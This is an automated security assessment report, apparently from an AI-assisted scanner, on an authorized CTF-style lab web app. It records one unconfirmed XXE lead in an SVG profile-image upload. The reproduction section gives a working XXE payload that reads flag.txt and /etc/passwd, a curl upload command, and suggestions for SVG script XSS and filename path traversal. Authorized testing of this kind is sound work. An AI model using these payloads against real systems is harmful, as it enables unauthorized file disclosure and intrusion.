# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Suspected (needs manual verification)](#suspected-needs-manual-verification)
    - [1. HIGH — path-traversal SVG profile-image upload likely vulnerable to XXE file disclosure (flag.txt) — could not deliver payload](#finding-1)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mr1fql14-f8fyr3` |
| Target | http://target.local:32822/ |
| Started | 2026-07-01T02:07:14.151Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 1 mapped · 1 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 0 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32822`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

_No confirmed findings._

_Plus 1 suspected lead(s) needing manual verification — listed separately below, NOT counted above._

## Suspected (needs manual verification)

_Leads with one concrete observed anomaly but without control+2-replay confirmation. NOT counted in the confirmed total above — verify before relying on them._

<a id="finding-1"></a>

### 1. [SUSPECTED] [HIGH] [path-traversal] SVG profile-image upload likely vulnerable to XXE file disclosure (flag.txt) — could not deliver payload

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32822/

**Anomaly (why this is a lead):** GET / exposes an SVG-only "Profile Image" upload (image is a strict FastAPI UploadFile — a urlencoded string is rejected 422) on a Python/uvicorn backend, and GET /hint leaks a directory listing containing app/flag.txt + main.py. SVG is XML, so this upload is a textbook XXE/stored-XSS sink whose intended target is reading flag.txt. I could not deliver any file: the http tooling emits literal backslash-r-backslash-n rather than real CRLF, so python-multipart rejects every multipart body with "There was an error parsing the body". The XXE therefore could not be confirmed, only strongly inferred.

The root screen (/) is an unauthenticated "Edit Profile" form that accepts an SVG file via a strict multipart UploadFile ("Only SVG images supported"). SVG is an XML document; if the server parses it with an entity-resolving XML parser (lxml/ElementTree with resolve_entities, or renders the SVG inline as the "Current Image"), an uploaded SVG carrying an external-entity declaration would read local files. The /hint endpoint (linked in an HTML comment on /) returns a directory listing that reveals the file-read prize: app/flag.txt (alongside main.py, Dockerfile, templates/index.html), confirming a CTF-style arbitrary-file-read objective. Two distinct exploitation avenues live on this same upload: (1) XXE arbitrary file read via `<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///app/flag.txt">]>` with `&x;` rendered back as the current image; (2) stored XSS if the raw SVG (which can contain <script>/onload) is served or embedded inline in a victim's browser. Neither could be delivered: the image field only accepts a real multipart file (urlencoded → 422 "Expected UploadFile"), and the available HTTP tooling cannot emit CRLF, so python-multipart rejects every crafted upload. The text fields (name/surname/address) were tested and are safe — reflected into value="..." but HTML-escaped, and {{7*7}} is not template-evaluated.

**Reproduction**

```
1) GET /hint → directory listing reveals app/flag.txt + main.py (Python/FastAPI/uvicorn). 2) GET / → unauthenticated form with an SVG file upload ("Profile Image (SVG)", "Only SVG images supported"). 3) Craft xxe.svg: `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]><svg xmlns="http://www.w3.org/2000/svg"><text x="10" y="20">&xxe;</text></svg>`. 4) Deliver as a real multipart upload — e.g. `curl -F name=a -F surname=b -F address=c -F image=@xxe.svg http://target.local:32822/` — and inspect the returned "Current Image" for flag.txt contents (also try file:///etc/passwd). NOTE: could not be delivered from this harness — image is a strict UploadFile (urlencoded → 422) and the http_request/probe tools pass literal "\r\n" so python-multipart returns 400 "error parsing the body". Also test the SVG stored-XSS avenue (SVG with <script>) and the multipart filename for path traversal (filename="../../../etc/passwd").
```

**Evidence**

- Evidence `ev-mr1fssj8-1` — `artifacts/s-0001/ev-mr1fssj8-1/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32822
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1968
content-type: text/html; charset=utf-8
date: Wed, 01 Jul 2026 02:08:56 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
    <title>Edit Profile</title>
</head>
<body>
    <div class="container mt-5">
        <h1>Edit Profile</h1>
        <form action="/" method="post" enctype="multipart/form-data">
            <div class="form-group">
                <label for="name">Name</label>
                <input type="text" class="form-control" id="name" name="name" value="verdict-probe">
            </div>
            <div class="form-group">
                <label for="surname">Surname</label>
                <input type="text" class="form-control" id="surname" name="surname" value="verdict-probe">
            </div>
            <div class="form-group">
                <label for="address">Address</label>
                <input type="text" class="form-control" id="address" name="address" value="verdict-probe">
            </div>
            <div class="form-group">
                <label for="image">Profile Image (SVG)</label>
                <input type="file" class="form-control-file" id="image" name="image">
                
                    <div class="mt-3">
                        <h5>Current Image:</h5>
                        <div>Only SVG images supported</div>
                    </div>
                
            </div>
            <button type="submit" class="btn btn-primary">Update Profile</button>
        </form>
        <!--a href="/hint">Hint</a-->
    </div>
</body>
</html>
```
